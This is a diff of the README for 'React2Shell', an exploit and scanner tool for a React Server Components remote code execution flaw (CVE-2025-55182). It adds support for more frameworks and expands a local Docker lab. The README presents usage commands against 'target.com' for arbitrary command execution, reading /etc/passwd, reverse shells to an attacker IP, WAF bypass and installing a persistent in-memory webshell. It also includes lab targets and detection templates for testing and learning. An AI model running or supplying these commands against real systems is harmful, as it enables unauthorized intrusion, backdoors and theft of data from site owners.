@@ -14,16 +14,23 @@ React2Shell/
 ├── cli/                  # Command-line scanner & exploit tool
 │   ├── react2shell.py
 │   └── requirements.txt
-├── docs/                 # Documentation and references
-│   ├── CVE-2025-55182.md
-│   └── reference/
+├── docs/                 # Learning-focused documentation
+│   ├── README.md         # Learning path index
+│   ├── 01-fundamentals.md
+│   ├── 02-vulnerability.md
+│   ├── 03-exploitation.md
+│   ├── 04-frameworks.md
+│   └── 05-defense.md
 ├── lab/                  # Docker lab environment for testing
 │   ├── vulnerable/       # Vulnerable Next.js app (React 19.2.0)
 │   ├── patched/          # Patched Next.js app (React 19.2.1)
 │   ├── waf/              # ModSecurity WAF container
+│   ├── waku-app/         # Vulnerable Waku app (React 19.2.0)
+│   ├── react-router-app/ # Vulnerable React Router app (React 19.2.0)
 │   └── docker-compose.yml
 └── nuclei/               # Nuclei templates
-    └── CVE-2025-55182.yaml
+    ├── CVE-2025-55182.yaml       # RCE detection (executes code)
+    └── CVE-2025-55182-safe.yaml  # Safe side-channel detection
 ```
 
 ## Quick Start
@@ -54,9 +61,14 @@ python react2shell.py https://target.com -i
 cd lab
 docker-compose up -d
 
-# Vulnerable: http://localhost:3011
-# Patched: http://localhost:3012
-# WAF Protected: http://localhost:3013
+# Exploitable targets:
+# Next.js Vulnerable:    http://localhost:3011  ← Full RCE
+# Waku Vulnerable:       http://localhost:3014  ← RCE (blind - no HTTP output)
+# React Router:          http://localhost:3015  ← Full RCE (ESM)
+
+# Protected targets:
+# Next.js Patched:       http://localhost:3012  ← Secure
+# WAF Protected:         http://localhost:3013  ← ModSecurity blocks exploits
 ```
 
 ### Nuclei Scanner
@@ -67,10 +79,14 @@ nuclei -t nuclei/CVE-2025-55182.yaml -u https://target.com
 ## Features
 
 ### CLI Tool (`cli/react2shell.py`)
+- **Multi-framework support** - Next.js, Waku, React Router, Expo, Vite RSC, Parcel RSC
+- **Framework detection** (`--detect`) - Auto-detect target framework
+- **Endpoint enumeration** (`-E`) - Discover RSC endpoints automatically
 - **Vulnerability scanning** - Single URL or batch scanning from file
 - **Command execution** (`-c`) - Run arbitrary commands
 - **Interactive shell** (`-i`) - Persistent command session
 - **Reverse shell** (`-r`) - Multiple types: nc, bash, perl, python, ruby
+- **In-memory webshell** (`--webshell`) - Persistent backdoor installation
 - **File reading** (`-f`) - Read remote files directly
 - **Local scanning** (`-L`) - Check package.json for vulnerable versions
 - **WAF bypass** - Junk padding (`-w`), Unicode encoding (`-u`), Vercel-specific (`-V`)
@@ -85,16 +101,31 @@ nuclei -t nuclei/CVE-2025-55182.yaml -u https://target.com
 - Visual vulnerable/safe indicators
 
 ### Lab Environment (`lab/`)
-- Vulnerable Next.js instance with CTF flags
-- Patched instance for comparison testing
-- WAF-protected instance for bypass testing
-- Dashboard for attack visualization
+- **Vulnerable Next.js** (3011) - Full RCE with output via X-Action-Redirect
+- **Waku** (3014) - RCE confirmed, requires `/RSC/F/{x}/{y}.txt` path format
+- **React Router** (3015) - Full RCE using ESM-compatible `process.getBuiltinModule()`
+- **Patched Next.js** (3012) - For testing detection without exploitation
+- **WAF Protected** (3013) - ModSecurity rules for bypass research
+- **Dashboard** (8080) - Attack logging and visualization
 
 ## CLI Usage Examples
 
 ```bash
-# Basic scan
+# Basic scan (auto-detects framework)
 python react2shell.py https://target.com
+
+# Detect framework and enumerate endpoints
+python react2shell.py https://target.com --detect
+python react2shell.py https://target.com -E -v
+
+# Execute command on different frameworks
+python react2shell.py https://target.com -c "id"                    # Next.js (auto)
+python react2shell.py https://target.com -F waku -c "id"            # Waku (blind RCE)
+python react2shell.py https://target.com -F react-router -c "id"    # React Router (ESM)
+
+# Lab examples with output
+python react2shell.py http://localhost:3011 -c "cat /app/secret/flag.txt"  # Next.js
+python react2shell.py http://localhost:3015 -F react-router -c "id"        # React Router
 
 # Execute command with all WAF bypasses
 python react2shell.py https://target.com -c "cat /etc/passwd" -w -u
@@ -102,11 +133,14 @@ python react2shell.py https://target.com -c "cat /etc/passwd" -w -u
 # Interactive shell through proxy
 python react2shell.py https://target.com -i -x http://127.0.0.1:8080
 
+# Install in-memory webshell
+python react2shell.py https://target.com --webshell mypassword
+
 # Reverse shell
 python react2shell.py https://target.com -r -l 10.0.0.1 -p 4444 -S bash
 
 # Scan local project for vulnerable versions
-python react2shell.py -L /path/to/nextjs-app
+python react2shell.py -L /path/to/project
 
 # Batch scan with output
 python react2shell.py targets.txt -t 20 -o results.json -v
@@ -130,6 +164,10 @@ Scanning Options:
   -T, --timeout         Request timeout in seconds (default: 10)
   -s, --safe            Safe mode (no code execution)
   -L, --local           Scan local project directory
+  -F, --framework       Target framework (auto, nextjs, waku, react-router, expo)
+  -E, --enumerate       Enumerate RSC endpoints before exploitation
+  --detect              Only detect framework and list endpoints
+  --webshell            Install in-memory webshell
 
 Bypass Options:
   -w, --waf-bypass      Junk data padding
@@ -158,14 +196,20 @@ Output Options:
 |-------|-------|
 | **CVSS** | 10.0 (Critical) |
 | **Impact** | Unauthenticated Remote Code Execution |
-| **Affected** | React 19.x, Next.js 14.x/15.x with App Router |
+| **Affected** | Any RSC framework using vulnerable React versions |
 | **Mechanism** | Prototype pollution via React Flight Protocol |
 
-### Patched Versions
-| Package | Vulnerable | Patched |
-|---------|------------|---------|
+### Affected Frameworks
+| Framework | Vulnerable | Patched |
+|-----------|------------|---------|
 | React | 19.0.0 - 19.2.0 | 19.2.1+ |
 | Next.js | 14.0.0 - 15.4.7 | 15.4.8+ |
+| Waku | < 0.27.2 | 0.27.2+ |
+| React Router | 7.0.0 - 7.5.0 (RSC preview) | 7.5.1+ |
+| Expo | Experimental RSC | Update React |
+| @vitejs/plugin-rsc | All with vulnerable React | Update React |
+| @parcel/rsc | All with vulnerable React | Update React |
+| RedwoodJS (rwsdk) | All with vulnerable React | Update React |
 
 ## Credits
 
